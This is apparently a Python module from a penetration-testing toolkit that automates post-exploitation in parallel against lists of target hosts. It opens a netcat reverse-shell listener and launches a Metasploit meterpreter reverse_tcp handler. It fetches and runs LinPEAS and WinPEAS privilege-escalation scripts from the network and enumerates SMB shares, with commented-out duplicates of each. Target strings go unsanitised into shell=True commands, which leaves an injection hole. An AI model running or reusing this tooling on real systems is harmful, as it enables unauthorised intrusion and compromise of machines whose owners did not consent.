import subprocess
import os
import concurrent.futures
import socket

def create_target_folder(target):
    folder = f"results/{target}/post_exploitation"
    os.makedirs(folder, exist_ok=True)
    return folder
#--------------capture the raw output and saves in a file--------------------------------------------------------- 
#	# --- per-tool functions ---
#	def run_reverse_shell(target):
#	    outfile = f"results/{target}/post_exploitation/reverse_shell.txt"
#	    cmd = f"nc -lvp 4444 > {outfile}"
#	    subprocess.run(cmd, shell=True)
#
#	def run_meterpreter(target):
#	    outfile = f"results/{target}/post_exploitation/meterpreter.txt"
#	    cmd = (
#		f"msfconsole -q -x "
#		f"'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run; exit' "
#		f"> {outfile}"
#	    )
#	    subprocess.run(cmd, shell=True)
#
#	def run_linpeas(target):
#	    outfile = f"results/{target}/post_exploitation/linpeas.txt"
#	    cmd = (
#		f"wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/"
#		f"download/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > {outfile}"
#	    )
#	    subprocess.run(cmd, shell=True)
#
#	def run_winpeas(target):
#	    outfile = f"results/{target}/post_exploitation/winpeas.txt"
#	    cmd = (
#		f"wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/"
#		f"download/winpeas.exe -O winpeas.exe && ./winpeas.exe > {outfile}"
#	    )
#	    subprocess.run(cmd, shell=True)
#	    
#	def run_smbclient(target):
#	    outfile = f"results/{target}/post_exploitation/smbclient.txt"
#	    command = f"smbclient -L //{target} -N > {outfile}"
#	    subprocess.run(command, shell=True)
#
#	def run_smbmap(target):
#	    outfile = f"results/{target}/post_exploitation/smbmap.txt"
#	    command = f"smbmap -H {target} > {outfile}"
#	    subprocess.run(command, shell=True)
#
#-------------------------------------------------------------------------------------------------------
#___________________________________capture the live output and saves in output file____________________
def run_reverse_shell(target):
    outfile = f"results/{target}/post_exploitation/reverse_shell.txt"
    # script -q (quiet), -c "cmd", outfile
    #cmd = f"script -q -c \"nc -lvp 4444\" {outfile}"
    cmd = f"nc -lvp 4444 | tee {outfile}"
    subprocess.run(cmd, shell=True)

#def run_meterpreter(target):
#    outfile = f"results/{target}/post_exploitation/meterpreter.txt"
#    # wrap the entire msfconsole session
#    cmd = (
#        f"script -q -c "
#        f"\"msfconsole -q -x 'use exploit/multi/handler; "
#        f"set payload windows/meterpreter/reverse_tcp; run; exit'\" "
#        f"{outfile}"
 #   )
#    subprocess.run(cmd, shell=True)
 #------------------ working version----------------------------------------------------------------------  
#def run_meterpreter(target):
#    outfile = f"results/{target}/post_exploitation/meterpreter.txt"
#    # wrap the entire msfconsole session so you capture everything
#    cmd = (
#        f"script -q -c "
#        f"\"msfconsole -q -x 'use exploit/multi/handler; "
#        f"set payload windows/meterpreter/reverse_tcp; set LHOST {target}; set LPORT 4444; run; exit'\" "
#        f"{outfile}"
#    )
#    subprocess.run(cmd, shell=True)
#----------------------------------------------------------------------------------------------------------

def run_meterpreter(target):
    """
    Launch msfconsole handler setting LHOST to `target`
    (as entered on the CLI), LPORT=4444, and log the full
    session to results/{target}/post_exploitation/meterpreter.txt
    """
    outfile = f"results/{target}/post_exploitation/meterpreter.txt"
    lhost   = target
    lport   = 4444

    # wrap msfconsole so we capture everything into our outfile
    cmd = (
        f"script -q -c "
        f"\"msfconsole -q -x 'use exploit/multi/handler; "
        f"set payload windows/meterpreter/reverse_tcp; "
        f"set LHOST {lhost}; set LPORT {lport}; run; exit'\" "
        f"{outfile}"
    )
    subprocess.run(cmd, shell=True)
    
#---------------------------------------------------------------------------------------

#def run_meterpreter(target):
#    """
#    Launch msfconsole handler with LHOST auto‐detected (our IP),
#    LPORT=4444, and capture the full session output to
#    results/{target}/post_exploitation/meterpreter.txt
#    """
#    # where to save it
#    outfile = f"results/{target}/post_exploitation/meterpreter.txt"
#    
#    # auto‐detect the local IP (so we bind on our interface, not the victim’s)
#    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#    try:
#        # this doesn’t actually send, just picks the right interface
#        s.connect(("8.8.8.8", 80))
#        lhost = s.getsockname()[0]
#    except Exception:
#        lhost = "0.0.0.0"
#    finally:
#        s.close()
#    lport = 4444
#
#    # wrap the entire msfconsole session so we capture *everything* in our outfile
#    cmd = (
#        f"script -q -c "
#        f"\"msfconsole -q -x 'use exploit/multi/handler; "
#        f"set payload windows/meterpreter/reverse_tcp; "
#        f"set LHOST {lhost}; set LPORT {lport}; run; exit'\" "
#        f"{outfile}"
#    )
#    subprocess.run(cmd, shell=True)
#--------------------------------------------------------------------------------------------------------------

def run_linpeas(target):
    outfile = f"results/{target}/post_exploitation/linpeas.txt"
    cmd = (
        f"script -q -c "
        f"\"wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/"
        f"download/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh\" "
        f"{outfile}"
    )
    subprocess.run(cmd, shell=True)

def run_winpeas(target):
    outfile = f"results/{target}/post_exploitation/winpeas.txt"
    cmd = (
        f"script -q -c "
        f"\"wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/"
        f"download/winpeas.exe -O winpeas.exe && ./winpeas.exe\" "
        f"{outfile}"
    )
    subprocess.run(cmd, shell=True)

def run_smbclient(target):
    outfile = f"results/{target}/post_exploitation/smbclient.txt"
    cmd = f"script -q -c \"smbclient -L //{target} -N\" {outfile}"
    subprocess.run(cmd, shell=True)

def run_smbmap(target):
    outfile = f"results/{target}/post_exploitation/smbmap.txt"
    cmd = f"script -q -c \"smbmap -H {target}\" {outfile}"
    subprocess.run(cmd, shell=True)

# tool→func mapping
tools_mapping = {
    "Reverse Shell": run_reverse_shell,
    "Meterpreter":   run_meterpreter,
    "LinPEAS":       run_linpeas,
    "WinPEAS":       run_winpeas,
    "SMBclient": run_smbclient,
    "SMBmap": run_smbmap
}

def run_post_exploitation_tools(target, tools):
    """
    Run selected post-exploitation tools *in parallel* against one target.
    """
    create_target_folder(target)
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {
            executor.submit(tools_mapping[tool], target): tool
            for tool in tools if tool in tools_mapping
        }
        for future in concurrent.futures.as_completed(futures):
            tool = futures[future]
            try:
                future.result()
                print(f"[+] {tool} completed successfully on {target}")
            except Exception as e:
                print(f"[!] {tool} failed on {target}: {e}")

    print(f"[+] Post-exploitation finished for {target}\n")


def run_post_exploitation_batch(targets, tools):
    """
    Fire off one thread per target, each running run_post_exploitation_tools().
    """
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {
            executor.submit(run_post_exploitation_tools, t.strip(), tools): t.strip()
            for t in targets if t.strip()
        }
        for future in concurrent.futures.as_completed(futures):
            tgt = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"[!] Error post-exploiting {tgt}: {e}")
    print("[+] All post-exploitation batches complete.\n")
